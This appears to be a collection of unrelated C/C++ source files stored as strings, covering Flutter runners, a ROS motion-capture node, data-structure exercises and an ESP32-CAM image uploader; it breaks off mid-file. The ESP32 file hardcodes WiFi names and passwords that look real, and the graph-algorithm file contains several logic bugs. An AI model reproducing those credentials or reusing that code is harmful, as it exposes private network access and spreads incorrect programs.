    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"temp_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <iostream>\n\n#include \"ros/ros.h\"\n#include \"owl.hpp\"\n#include \"std_msgs/String.h\"\n#include \"phasespace/Camera.h\"\n#include \"phasespace/Cameras.h\"\n#include \"phasespace/Marker.h\"\n#include \"phasespace/Markers.h\"\n\nusing namespace std;\n\nint main(int argc, char** argv)\n{\n  // get the owl server address through the command line\n  // 'rosrun phasespace phasespace_node 192.168.1.123'\n  string address = argc > 1 ? argv[1] : \"localhost\";\n\n  // create the context\n  OWL::Context owl;\n  OWL::Markers markers;\n  OWL::Cameras cameras;\n\n  // initialize ROS\n  ros::init(argc, argv, \"phasespace_node\");\n  ros::NodeHandle nh;\n  ros::Publisher errorsPub = nh.advertise<std_msgs::String>(\"phasespace_errors\", 1000, true);\n  ros::Publisher camerasPub = nh.advertise<phasespace::Cameras>(\"phasespace_cameras\", 1000, true);\n  ros::Publisher markersPub = nh.advertise<phasespace::Markers>(\"phasespace_markers\", 1000);\n\n  // simple example\n  if(owl.open(address) <= 0 || owl.initialize(\"timebase=1,1000000\") <= 0) return 0;\n\n  // start streaming\n  owl.streaming(1);\n\n  //trackers for rigid body\n  uint32_t tracker_id = 1;\n  owl.createTracker(tracker_id, \"rigid\", \"tracker1\"); // poses from .json file\n  owl.assignMarker(tracker_id, 0, \"0\", \"pos=-54.2258,21.0052,-39.6339\");\n  owl.assignMarker(tracker_id, 1, \"1\", \"pos=1.81474,19.5109,-43.3484\");\n  owl.assignMarker(tracker_id, 2, \"2\", \"pos=-1.08682,16.1748,8.30817\");\n  owl.assignMarker(tracker_id, 3, \"3\", \"pos=120.753,-22.5629,-73.9617\");\n  owl.assignMarker(tracker_id, 4, \"4\", \"pos=143.678,-22.8856,45.8498\");\n  owl.assignMarker(tracker_id, 5, \"5\", \"pos=-45.3899,22.5002,63.1292\");\n  owl.assignMarker(tracker_id, 6, \"6\", \"pos=-75.0631,-16.2132,110.204\");\n  owl.assignMarker(tracker_id, 7, \"7\", \"pos=-90.4799,-17.5294,-70.5478\");\n\n\n\n  // main loop\n  while(ros::ok() && owl.isOpen() && owl.property<int>(\"initialized\"))\n    {\n      const OWL::Event *event = owl.nextEvent(1000);\n      if(!event) continue;\n\n      if(event->type_id() == OWL::Type::ERROR)\n        {\n          cerr << event->name() << \": \" << event->str() << endl;\n          std_msgs::String str;\n          str.data = event->str();\n          errorsPub.publish(str);\n        }\n      else if(event->type_id() == OWL::Type::CAMERA)\n        {\n          if(event->name() == string(\"cameras\") && event->get(cameras) > 0)\n            {\n              phasespace::Cameras out;\n              for(OWL::Cameras::iterator c = cameras.begin(); c != cameras.end(); c++)\n                {\n                  phasespace::Camera cam;\n                  //\n                  cam.id = c->id;\n                  cam.flags = c->flags;\n                  cam.x = c->pose[0];\n                  cam.y = c->pose[1];\n                  cam.z = c->pose[2];\n                  cam.qw = c->pose[3];\n                  cam.qx = c->pose[4];\n                  cam.qy = c->pose[5];\n                  cam.qz = c->pose[6];\n                  cam.cond = c->cond;\n                  //\n                  out.cameras.push_back(cam);\n                }\n              camerasPub.publish(out);\n            }\n        }\n      else if(event->type_id() == OWL::Type::FRAME)\n        {\n          if(event->find(\"markers\", markers) > 0)\n            {\n              phasespace::Markers out;\n              for(OWL::Markers::iterator m = markers.begin(); m != markers.end(); m++)\n                {\n                  phasespace::Marker mout;\n                  mout.id = m->id;\n                  mout.time = m->time;\n                  mout.flags = m->flags;\n                  mout.cond = m->cond;\n                  mout.x = m->x;\n                  mout.y = m->y;\n                  mout.z = m->z;\n                  out.markers.push_back(mout);\n                }\n\n              markersPub.publish(out);\n            }\n        }\n    } // while\n\n  owl.done();\n  owl.close();\n  \n  return 0;\n}\n",
    "#include <iostream>\n#include <unordered_map>\n#include <list>\n#include <mutex>\n#include <memory>\n\ntemplate<typename KeyType, typename ValueType>\nclass LRUCache {\npublic:\n    // Constructor to init the cache w/ a given capacity\n    explicit LRUCache(size_t size) : capacity(size) {}\n\n    // Function to retrieve a value from the cache\n    ValueType get(const KeyType& key) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock for thread safety\n        auto it = cache_map.find(key);  // Attempt to find the key in the hash map\n        if (it == cache_map.end()) {\n            throw std::range_error(\"Key not found\");  // Key not found, throw exception\n        }\n        \n        usage_list.splice(usage_list.begin(), usage_list, it->second); // Moves accessed node\n        return it->second->second;  // Return the value associated with the key\n    }\n\n    // Function to insert or update a value in the cache\n    void put(const KeyType& key, const ValueType& value) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock for thread safety\n        auto it = cache_map.find(key);  // Check if key already exists in the cache\n        if (it != cache_map.end()) {\n            // If key exists -> MRU\n            usage_list.splice(usage_list.begin(), usage_list, it->second);\n            it->second->second = value;  // Update the value\n            return;\n        }\n\n        // If cache full, evict the LRU item\n        if (usage_list.size() == capacity) {\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove from map\n            usage_list.pop_back();  // Remove from list\n        }\n\n        // Inserts the new key-value pair at the front of the list\n        usage_list.emplace_front(key, value);\n        cache_map[key] = usage_list.begin();  // Update map to point to the new element in the list\n    }\n\n    // Function to remove an object from the cache if it exists\n    void erase(const KeyType& key) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock to ensure thread safety\n        auto it = cache_map.find(key);  // Find the key in the map\n        if (it != cache_map.end()) {\n            usage_list.erase(it->second);  // Remove from list\n            cache_map.erase(it);  // Remove from map\n        }\n    }\n\n    // Function to dynamically adjust the cache's capacity\n    void resize(size_t new_capacity) {\n\tstd::lock_guard<std::mutex> lock(cache_mutex); // Lock to ensure thread safety\n        while (usage_list.size() > new_capacity) {  // If current size is larger than new capacity, reduce size\n            auto last = usage_list.end();\n            last--;\n            cache_map.erase(last->first);  // Remove least recently used items\n            usage_list.pop_back();\n        }\n        capacity = new_capacity;  // Set the new capacity\n    }\n\nprivate:\n    size_t capacity;  // Maximum number of elements in the cache\n    // List to track the least recent to most recently used objects\n    std::list<std::pair<KeyType, ValueType>> usage_list;  \n    // Map to quickly lookup elements in the list\n    std::unordered_map<KeyType, typename std::list<std::pair<KeyType, ValueType>>::iterator> cache_map;\n    std::mutex cache_mutex;  // Mutex to make class thread-safe\n};\n\nint main() {\n    LRUCache<int, std::string> cache(2);  // Create a cache for up to 2 items\n    cache.put(1, \"data1\");  // Insert item with key 1\n    cache.put(2, \"data2\");  // Insert item with key 2\n    try {\n        std::cout << \"1 -> \" << cache.get(1) << std::endl;  // Access item with key 1\n    } catch (const std::exception& e) {\n        std::cout << e.what() << std::endl;\n    }\n    cache.put(3, \"data3\");  // Insert item with key 3, causing key 2 to be evicted\n    try {\n        std::cout << \"2 -> \" << cache.get(2) << std::endl;  // Attempt to access item with key 2\n    } catch (const std::exception& e) {\n        std::cout << \"2 -> \" << e.what() << std::endl;  // Should print \"Key not found\"\n    }\n    return 0;\n}\n\n",
    "#include<bits/stdc++.h>\n#define FOR(i, a, b) for (int i = (a), _b = (b); i <= _b; i++)\n#define FORD(i, b, a) for (int i = (b), _a = (a); i >= _a; i--)\n#define REP(i, b) for (int i = 0, _b = (b); i < _b; i++)\n#define ii pair<int, int>\n#define pb push_back\n#define fi first\n#define se second\n#define mp make_pair\n#define ALL(v) (v).begin(), (v).end()\n#define MASK(i) (1LL << (i))\n#define BIT(x, i) (((x) >> (i)) & 1LL)\n#define ll long long\n#define ld long double\n#define sz(x) ((int)(x).size())\n#define next ____next\n#define prev ____prev\n#define left ____left\n#define right ___right\n#define lcm ___lcm\n#define index ____index\nusing namespace std;\n \ntemplate<class M> M myabs(M x) {\n        return x < 0 ? -x : x;\n}\ntemplate<class M1, class M2> bool minimize(M1 &x, const M2 &y) {\n        if (x > y) {x = y; return true;} return false;\n}\ntemplate<class M1, class M2> bool maximize(M1 &x, const M2 &y) {\n        if (x < y) {x = y; return true;} return false;\n}\n \nconst int INF = (int)1e9 + 7;\nconst ll INFLL = (ll)1e18 + 7LL;\n \nconst int dx[] = {1, 0, -1, 0, 1, -1, 1, -1};\nconst int dy[] = {0, 1, 0, -1, 1, -1, -1, 1};\n \n//mt19937 rd(time(0));\n#define ALPHABET 26 // number of alphabet\nstruct Node {\n    int next[ALPHABET];\n    int fail; // kmp at this node\n    int len; // depth level\n    vector<int> matches; // list nodes' id\n    Node() {\n        REP(i, ALPHABET) next[i] = -1; // point to null\n        fail = 0; // all kmp = 0\n        len = 0; // still dont have level yet\n        matches.clear();\n    }\n};\n \n#define MAX \n\nint n;\nvector<Node> trie;\n\n// add st to the set like normal\nvoid add(string st, int id) {\n    int u = 0;\n    for (auto c : st) {\n        int x = c - 'a'; // convert char to int\n        if (trie[u].next[x] == -1) { \n            trie[u].next[x] = sz(trie);\n            trie.push_back(Node());\n        }\n        trie[trie[u].next[x]].len = trie[u].len + 1; // calculate the level of next node\n        u = trie[u].next[x];\n    }\n    trie[u].matches.push_back(id); // add id to node \n}\n\n// AhoCorasick requires to BFS\nvoid AC_BFS() {\n    queue<int> q;\n    REP(c, ALPHABET) { // add first level \n        if (trie[0].next[c] == -1) { // if c does not exist in first level\n            trie[0].next[c] = 0; // we just give it the direction to root\n        } else {\n            q.push(trie[0].next[c]); // push into queue\n        }\n    }\n\n    // next: if next[c] does not exist in tree, we point to the deepest kmp node \n    // at that time, trie[u].next[c] is equal to trie[trie[u].next[c]].fail, if trie[u].next[c] was existed\n    while (!q.empty()) {\n        int u = q.front(); q.pop();\n        int f = trie[u].fail; // deepest kmp node of u\n        REP(c, ALPHABET) {\n            if (trie[u].next[c] == -1) { // if c does not exist in next level\n                trie[u].next[c] = trie[f].next[c]; // assign location to kmp node\n            } else { // if c does exist in next level\n                trie[trie[u].next[c]].fail = trie[f].next[c]; // assign the fail value of that node\n                q.push(trie[u].next[c]); // add to queue to repeat process \n            }\n        }\n    }\n}\n\n// find longest subsequence of st existing in set st, if not exist, print \"no existence!!\"\nstring query(string st) {\n    string res;\n    int u = 0;\n    ii ans = mp(0, -1);\n    REP(i, sz(st)) {\n        int x = st[i] - 'a'; //  convert char to int\n        u = trie[u].next[x];\n        if (!trie[u].matches.empty() && trie[u].len > ans.se - ans.fi + 1) \n            ans = mp(i - trie[u].len + 1, i); \n    }\n    if (ans == mp(0, -1)) res = \"no existence!!\";\n    else FOR(i, ans.fi, ans.se) res.push_back(st[i]);\n    return res;\n}\n\nvoid solve() {\n    cin >> n;\n    trie.push_back(Node());\n    FOR(i, 1, n) {\n        string st; cin >> st;\n        add(st, i);\n    }\n    cout << sz(trie) << \"\\n\";\n    AC_BFS();\n    int numQ; cin >> numQ;\n    FOR(i, 1, numQ) {\n        string st; cin >> st;\n        cout << query(st) << \"\\n\";\n    }\n}\n \nint main() {\n        ios_base::sync_with_stdio(false);\n        cin.tie(0);\n        #ifndef ONLINE_JUDGE\n        freopen(\"AhoCorasick.inp\", \"r\", stdin);\n        freopen(\"AhoCorasick.out\", \"w\", stdout);\n        #else\n        //\n        #endif // ONLINE_JUDGE*/\n        int t = 1; //cin >> t;\n        while (t--) solve();\n    return 0;\n}\n",
    "/*\n * Copyright (c) 2011-2015 BlackBerry Limited.\n *\n * Licensed under the Apache License, Version 2.0 (the \"License\");\n * you may not use this file except in compliance with the License.\n * You may obtain a copy of the License at\n *\n * http://www.apache.org/licenses/LICENSE-2.0\n *\n * Unless required by applicable law or agreed to in writing, software\n * distributed under the License is distributed on an \"AS IS\" BASIS,\n * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n * See the License for the specific language governing permissions and\n * limitations under the License.\n */\n\n#include \"applicationui.hpp\"\n\n#include <bb/cascades/Application>\n#include <bb/cascades/QmlDocument>\n#include <bb/cascades/AbstractPane>\n#include <bb/cascades/LocaleHandler>\n\nusing namespace bb::cascades;\n\nApplicationUI::ApplicationUI() :QObject() {\n    // prepare the localization\n    m_pTranslator = new QTranslator(this);\n    m_pLocaleHandler = new LocaleHandler(this);\n\n    bool res = QObject::connect(m_pLocaleHandler, SIGNAL(systemLanguageChanged()), this, SLOT(onSystemLanguageChanged()));\n    // This is only available in Debug builds\n    Q_ASSERT(res);\n    // Since the variable is not used in the app, this is added to avoid a\n    // compiler warning\n    Q_UNUSED(res);\n\n    // initial load\n    onSystemLanguageChanged();\n\n    // Create scene document from main.qml asset, the parent is set\n    // to ensure the document gets destroyed properly at shut down.\n    QmlDocument *qml = QmlDocument::create(\"asset:///main.qml\").parent(this);\n    qml->setContextProperty(\"app\", this);\n\n    // Create root object for the UI\n    AbstractPane *root = qml->createRootObject<AbstractPane>();\n\n    // Set created root object as the application scene\n    Application *appInstance = Application::instance();\n    appInstance->setScene(root);\n\n    appInstance->setAutoExit(false);\n    res = QObject::connect(appInstance, SIGNAL(manualExit()), this, SLOT(onManualExit()));\n    Q_ASSERT(res);\n\n    hotp.generate_hmac_sha1(\"12345678\", \"12345678\");\n}\n\nvoid ApplicationUI::onManualExit() {\n\tqDebug() << \"onManualExit\";\n\thotp.~HOTP();\n\tApplication::instance()->extendTerminationTimeout();// for 2 sec\n\tApplication::instance()->quit();\n}\n\nvoid ApplicationUI::onSystemLanguageChanged() {\n    QCoreApplication::instance()->removeTranslator(m_pTranslator);\n    // Initiate, load and install the application translation files.\n    QString locale_string = QLocale().name();\n    QString file_name = QString(\"Authenticator_%1\").arg(locale_string);\n    if (m_pTranslator->load(file_name, \"app/native/qm\")) {\n        QCoreApplication::instance()->installTranslator(m_pTranslator);\n    }\n}\n",
    "#include \"aos.hpp\"\r\n\r\n// This is a demo of the \"AOS\" library, devoloped by XeTute. \r\n// XeTutes website: \"https://xetute.neocities.org/\"\r\n\r\nint main()\r\n{\r\n\tAOS<AOS<int>> myArray(6); //create two-dimensional array with the data-type of int\r\n\tmyArray.resize(3); //Resize the array. Got it working, finally =)\r\n\r\n\t{ //bracets cuz var \"aSize\" is tmp \r\n\t\tconst size_t aSize = myArray.size(); // aSize = array size\r\n\t\tfor (size_t row = 0; row < aSize; ++row) //init each element\r\n\t\t{\r\n\t\t\tmyArray[row].init(aSize, 9);\r\n\t\t\t//myArray[row].init(aSize); <-- This line would automatically set every value to \"NULL\" / 0. Nice, right? :3\r\n\r\n\t\t\tfor (size_t column = 0; column < aSize; ++column) \r\n\t\t\t{\r\n\t\t\t\tmyArray[row][column] = row * column; //assign unique value. It would not crash, because AOS auto-inits to zero if not value was provided\r\n\t\t\t\tstd::cout << myArray[row][column] << \" | \"; // std::cout << myArray.data[row].data[column] would also work, operator was overloaded\r\n\t\t\t}\r\n\t\t\tstd::cout << \"\\n-----------\\n\";\r\n\t\t}\r\n\t}\r\n\t\r\n\tmyArray.suicide(); //Let the array kill itself. This prevents memory leaks\r\n\r\n\treturn 0;\r\n}\r\n",
    "#include<bits/stdc++.h>\nusing namespace std;\n\n\n// breadth first search in graph \nvector<int> bfsGraph(int V, vector<int> adjLs[]){\n    queue<int> q; // queue\n    vector<int> ans; // ans \n    q.push(0);\n    vector<bool> vis(V,false); // visited array\n    vis[0]=true;\n    int node;\n    while(!q.empty()){\n        node = q.front();\n        q.pop();\n        ans.push_back(node);\n        for(int i = 0; i<adjLs[node].size() ; i++){\n            if(vis[adjLs[node][i]]==false){\n                vis[adjLs[node][i]]==true;\n                q.push(adjLs[node][i]);\n            }\n        }\n    }\n    return ans;\n}\n\n// Depth first search in graph \nvoid dfs(int node, vector<int> adj[],vector<bool> &vis, vector<int> &ans){\n    vis[node]=true;\n    ans.push_back(node);\n    for(int i = 0; i<adj[node].size() ; i++){\n        if(vis[adj[node][i]]==false){\n            dfs(adj[node][i],adj,vis,ans);\n        }\n    }\n}\nvector<int> dfsGraph(int V, vector<int> adj[]){\n    int start=0;\n    vector<int> ans;\n    vector<bool> vis(V,false);\n    dfs(start,adj,vis,ans);\n    return ans;\n}\n\nint main(){\n    int n; // number of nodes \n    int m; // number of edges\n    cin >> n >> m;\n    int adjMat[n+1][m+1]; // defining the ajdacency matrix\n    // initialising the matrix to zero\n    for(int i = 0; i<n ; i++){\n        for(int j = 0; j<m ; j++){\n            adjMat[i][j]=0;\n        }\n    }\n    // adding the connections between the vertices\n    for(int i = 0; m ; i++){\n        int u,v;\n        cin >> u >> v;\n        adjMat[u][v]=1;\n        adjMat[v][u]=1;\n    }\n    vector<vector<int>> adjList(n+1); // defining the adjacency list \n    for(int i = 0; i<m ; i++){\n        int u,v;\n        cin >> u >> v;\n        adjList[u].push_back(v);\n        adjList[v].push_back(u);\n    }\n}\n// =========================================== // \n// CYCLE DETECTION USING DFS\n// =========================================== // \nbool checkForCycle(int node, int parent, vector<bool>&visited,vector<int> adj[]){\n    visited[node]=true;\n    for(int i=0;i<adj[node].size();i++){\n        int neighbor = adj[node][i];\n        if(neighbor==parent){\n            continue;\n        }\n        if(visited[neighbor]==true){\n            return true;\n        }\n        if(visited[neighbor]==false){\n            if(checkForCycle(neighbor,node,visited,adj)==true){\n                return true;\n            }\n        }\n    }\n    return false;\n}\nbool isCycle(int V, vector<int> adj[]){\n    vector<bool> visited(V,false);\n    for(int i=0;i<V;i++){\n        if(visited[i]==false){\n            if(checkForCycle(i,-1,visited,adj)==true){\n                return true;\n            }\n        }\n    }\n    return false;\n}\n// =========================================== // \n// CYCLE DETECTION USING BFS\n// =========================================== // \nbool checkForCycleBFS(vector<int> adj[], vector<bool> &visited, int node){\n    visited[node]= true;\n    queue<pair<int,int>> q;\n    q.push(make_pair(node,-1));\n    while(q.empty()==false){\n        int node = q.front().first;\n        int parent = q.front().second;\n        q.pop();\n        for(int i=0;i<adj[node].size();i++){\n            int neighbor = adj[node][i];\n            if(neighbor==parent){\n                continue;\n            }\n            if(visited[neighbor]==true){\n                return true;\n            }\n            if(visited[neighbor]==false){\n                visited[neighbor]=true;\n                q.push(make_pair(neighbor,node));\n            }\n        }\n    }\n    return false;\n}\nbool isCycle(int V, vector<int> adj[]){\n    vector<bool> visited(V,false);\n    for(int i = 0; i<V ; i++){\n        if(visited[i]==false){\n            if(checkForCycleBFS(adj,visited,i)==true){\n                return true;\n            }\n        }\n        return false;\n    }\n}\n// =========================================== // \n// TOPOLOGICAL SORT USING DFS\n// =========================================== // \nvoid dfsTopSort(int node, vector<bool>&visited, vector<int> adj[],stack<int> &s){\n    visited[node]=true;\n    for(int i=0;i<adj[node].size();i++){\n        if(visited[adj[node][i]]==false){\n            dfsTopSort(adj[node][i],visited,adj,s);\n        }\n\n    }\n    s.push(node);\n\n}\nvector<int> topologicalSortDFS(int V, vector<int> adj[]){\n    vector<bool> visited(V,false);\n    stack<int> s;\n    vector<int> ans;\n    for(int i=0;i<V;i++){\n        if(visited[i]==false){\n            dfsTopSort(i,visited,adj,s);\n        }\n    }\n    while(s.empty()==false){\n        ans.push_back(s.top());\n        s.pop();\n    }\n    return ans;\n}\n// =========================================== // \n// TOPOLOGICAL SORT USING BFS ( KAHN\"S ALGORITHM )\n// =========================================== // \nvector<int> kahnsAlgorithm(int V, vector<int> adj[]){\n    vector<int> ans;\n    vector<int> inDegree(V,0);\n    for(int i=0;i<V;i++){\n        for(int j=0;j<adj[i].size();j++){\n            int node = adj[i][j];\n            inDegree[node]++;\n        }\n    }\n    queue<int> q;\n    for(int i=0;i<V;i++){\n        if(inDegree[i]==0){",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"webapplicationdemo\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include <stdio.h>\r\n#include<stdlib.h>\r\n#define TABLE_SIZE 10\r\nint h[TABLE_SIZE]={NULL};\r\nvoid insert()\r\n{\r\nint key,index,i,flag=0,hkey;\r\nprintf(\"\\nenter a value to insert into hash table\\n\");\r\nscanf(\"%d\",&key);\r\nhkey=key%TABLE_SIZE;\r\nfor(i=0;i<TABLE_SIZE;i++)\r\n {\r\n index=(hkey+i)%TABLE_SIZE;\r\n if(h[index] == NULL)\r\n {\r\n\r\n h[index]=key;\r\n break;\r\n }\r\n }\r\n if(i == TABLE_SIZE)\r\n printf(\"\\nelement cannot be inserted\\n\");\r\n}\r\nvoid search()\r\n{\r\nint key,index,i,flag=0,hkey;\r\nprintf(\"\\nenter search element\\n\");\r\nscanf(\"%d\",&key);\r\nhkey=key%TABLE_SIZE;\r\nfor(i=0;i<TABLE_SIZE; i++)\r\n{\r\n index=(hkey+i)%TABLE_SIZE;\r\n if(h[index]==key)\r\n {\r\n printf(\"value is found at index %d\",index);\r\n break;\r\n }\r\n }\r\n if(i == TABLE_SIZE)\r\n printf(\"\\n value is not found\\n\");\r\n}\r\nvoid display()\r\n{\r\n int i;\r\n printf(\"\\nelements in the hash table are \\n\");\r\n for(i=0;i< TABLE_SIZE; i++)\r\n\r\n printf(\"\\nat index %d \\t value = %d\",i,h[i]);\r\n}\r\nmain()\r\n{\r\n int opt,i;\r\n while(1)\r\n {\r\n printf(\"\\nPress 1. Insert\\t 2. Display \\t3. Search \\t4.Exit \\n\");\r\n scanf(\"%d\",&opt);\r\n switch(opt)\r\n {\r\n case 1:\r\n insert();\r\n break;\r\n case 2:\r\n display();\r\n break;\r\n case 3:\r\n search();\r\n break;\r\n case 4:exit(0);\r\n }\r\n }\r\n}\r\n",
    "#include <ArduinoJson.h>\n#include <esp32cam.h>\n#include <WifiEspNow.h>\n#include <HTTPClient.h>\n#include <WiFi.h>\n#include <StreamString.h> // For StreamBuffer functionality\n\n#define CHANNEL 1\n\n// const char* ssid = \"Miras Family 2.5\";\n// const char* password = \"dingyenajjanjan18763\";\nconst char* ssid = \"SABAKADIHA 2.4\";\nconst char* password = \"Neyney2008@\";\n// const char* apiUrl = \"http://192.168.254.103:8000/upload\"; // LOCAL ADDRESS FOR TESTING\nconst char* apiUrl = \"http://172.83.14.130:8000/upload\"; // REMOTE SERVER ADDRESS\nconst uint8_t PEER[]{0x4A, 0x55, 0x19, 0xC8, 0x6B, 0x21};\n\nstatic bool isWasteDetected;\n\nesp32cam::Resolution initialResolution = esp32cam::Resolution::find(255, 255);\n\nvoid setupCamera() {\n    using namespace esp32cam;\n\n    Config cfg;\n    cfg.setPins(pins::AiThinker);\n    cfg.setResolution(initialResolution);\n    cfg.setJpeg(80);\n\n    bool ok = Camera.begin(cfg);\n    if (!ok) {\n        Serial.println(\"camera initialize failure\");\n        delay(5000);\n        ESP.restart();\n    }\n    Serial.println(\"camera initialize success\");\n}\n\n// returns -1 if there are errors, 0 if the waste is not biodegradable, 1 if the waste is biodegradable\nshort sendImageToAPI(uint8_t * imageData, size_t imageSize) {\n    short response;\n    HTTPClient client;\n    if (client.begin(apiUrl)) {\n        client.addHeader(\"Content-Type\", \"application/octet-stream\");\n        int httpResponseCode = client.POST(imageData, imageSize);\n        if (httpResponseCode > 0) {\n            Serial.print(\"HTTP Response code: \");\n            Serial.println(httpResponseCode);\n            String responseBody = client.getString();\n            Serial.println(responseBody);\n\n            JsonDocument doc;\n            deserializeJson(doc, responseBody);\n            bool whatIsWaste = doc[\"message\"][\"isWasteBiodegradable\"];\n            Serial.print(\"Is Waste Biodegradable: \");\n            Serial.println(whatIsWaste);\n\n            response = whatIsWaste;\n        } else {\n            Serial.println(\"Error sending data\");\n            response = -1;\n        }\n    client.end();\n    } else {\n        Serial.println(\"Connection to server failed\");\n        response = -1;\n    }\n    return response;\n}\n\nauto captureImage() -> std::unique_ptr<esp32cam::Frame> {\n    auto frame = esp32cam::capture();\n    if (frame == nullptr) {\n            Serial.println(\"capture() failure\");\n    } else {\n        Serial.printf(\"capture() success: %dx%d %zub\\n\", frame->getWidth(), frame->getHeight(), frame->size());\n    }\n    return frame;\n}\n\nvoid onWasteDetectedESPNow(const uint8_t mac[WIFIESPNOW_ALEN], const uint8_t* buf, size_t count, void* arg) { \n    Serial.println();\n    Serial.print(\"Message Received From: \");\n    Serial.printf(\"{0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X};\\n\", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);\n    Serial.println();\n    if (buf[0] != 0) {\n            // if there is waste detected (i.e: :param:buf == true)\n            isWasteDetected = true;\n    }\n}\n\nvoid setupESPNOW() {\n    bool ok = WifiEspNow.begin();\n    if (!ok) {\n        Serial.println(\"WifiEspNow.begin() failed\");\n        ESP.restart();\n    }\n\n    WifiEspNow.onReceive(onWasteDetectedESPNow, nullptr);\n\n    ok = WifiEspNow.addPeer(PEER);\n    if (!ok) {\n        Serial.println(\"WifiEspNow.addPeer() failed\");\n        ESP.restart();\n    }\n}\n\nvoid testCaptureImageAndSendToAPI() {\n    auto frame = captureImage();\n    if (frame != nullptr) {\n        Serial.println(\"Sending Image To API\");\n        short response = sendImageToAPI(frame->data(), frame->size());\n        Serial.print(\"Response: \");\n        Serial.println(response);\n    }\n}\n\nvoid testJsonResponse() {\n    HTTPClient client;\n    const char* url = \"http://192.168.254.103:8000\";\n    if (client.begin(url)) {\n        int httpResponseCode = client.GET();\n        if (httpResponseCode > 0) {\n            Serial.print(\"HTTP Response code: \");\n            Serial.println(httpResponseCode);\n            String responseBody = client.getString();\n            Serial.println(responseBody);\n\n            JsonDocument doc;\n            deserializeJson(doc, responseBody);\n            bool whatIsWaste = doc[\"message\"][\"isWasteBiodegradable\"];\n            Serial.print(\"Is Waste Biodegradable: \");\n            Serial.println(whatIsWaste);\n        } else {\n            Serial.println(\"Error sending data\");\n        }\n    client.end();\n    } else {\n        Serial.println(\"Connection to server failed\");\n    }\n}\n\nvoid printMacAddress() {\n    Serial.print(\"MAC address of this node is \");\n    Serial.println(WiFi.softAPmacAddress());\n\n    uint8_t mac[6];\n    WiFi.softAPmacAddress(mac);\n    Serial.println();\n    Serial.println(\"You can paste the following into the program for the other device:\");\n    Serial.printf(\"static uint8_t PEER[]{0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X, 0x%02X};\\n\", mac[0],\n                    mac[1], mac[2], mac[3], mac[4], mac[5]);\n    Serial.println();\n}\n\nvoid setup() {\n    Serial.begin(115200);\n    Serial.println();\n\n    delay(20",
